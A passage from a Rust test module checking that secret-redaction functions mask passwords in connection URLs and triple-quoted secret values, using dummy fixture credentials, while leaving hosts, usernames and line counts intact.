        for (url, host) in [
            (
                "smtp://alerts@corp.com:Sup3r-sensitive@smtp.corp.com:587",
                "@smtp.corp.com:587",
            ),
            (
                "redis://default:2024/abc-sensitive@cache:6379",
                "@cache:6379",
            ),
            ("postgres://u:5432/sensitive@db/app", "@db/app"),
        ] {
            let output = url_credentials(url);
            assert!(!output.contains("sensitive"), "{url} -> {output}");
            assert!(output.ends_with(host), "{url} -> {output}");
        }
        // A username with no password, and a port, stay visible.
        for visible in [
            "https://user@host:8443/path",
            "ssh://git@github.com:22/org/repo",
        ] {
            assert_eq!(url_credentials(visible), visible);
        }
    }

    #[test]
    fn triple_quoted_secrets_are_masked_with_their_lines() {
        for input in [
            "password = \"\"\"\nfixture-line-one\nfixture-line-two\n\"\"\"\nvisible = 1\n",
            "secret = '''fixture-line-one\nfixture-line-two'''\nvisible = 1\n",
            "api_key = \"\"\"fixture-unterminated\nfixture-line-two\n",
        ] {
            let output = whole_text(input);
            assert!(!output.contains("fixture"), "{output:?}");
            assert_eq!(output.lines().count(), input.lines().count(), "{output:?}");
            if input.contains("visible") {
                assert!(output.contains("visible = 1"), "{output:?}");
            }
        }
    }
}
